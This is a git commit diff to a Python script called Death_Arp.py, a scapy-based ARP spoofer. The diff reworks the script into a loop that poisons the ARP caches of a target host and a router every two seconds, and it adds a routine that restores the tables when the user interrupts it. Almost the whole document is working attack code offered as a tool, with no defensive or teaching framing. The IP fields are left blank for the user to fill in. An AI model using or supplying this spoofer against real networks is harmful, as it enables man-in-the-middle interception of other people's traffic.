d47c0890b39b2dc1b88a1047d286153a9e6945cc
Shivam Singh <dreamyshivam01@gmail.com>
2025-02-05 22:31:18 +0530

    Death_Arp - ARP Spoofer powered by ANOTNET

--- Death_Arp.py
+++ Death_Arp.py
@@ -1,6 +1,5 @@
 import scapy.all as scapy
 import time
-import sys
 
 def get_mac(ip):    
     arp_request = scapy.ARP(pdst=ip)
@@ -14,14 +13,24 @@ def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac , psrc=spoof_ip)
     scapy.send(packet)
-      
 
-sent_packets_count = 0
-while True:
-    spoof("target ip", "router ip")
-    spoof("router ip", "target ip")
-    sent_packets_count = sent_packets_count + 2
-    print("\r[+] Packets sent: " + str(sent_packets_count), end="")
-    sys.stdout.flush()
-    time.sleep(2)
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac , psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4 , verbose=False)    
 
+target_ip = ""
+router_ip = ""    
+
+try:
+    while True:
+        spoof(target_ip , router_ip) 
+        spoof(router_ip, target_ip)
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("\n[-] Detected CTRL + C ... Resetting ARP tables.... Please wait.\n")
+    restore(target_ip, router_ip)
+    restore(router_ip, target_ip)
+    
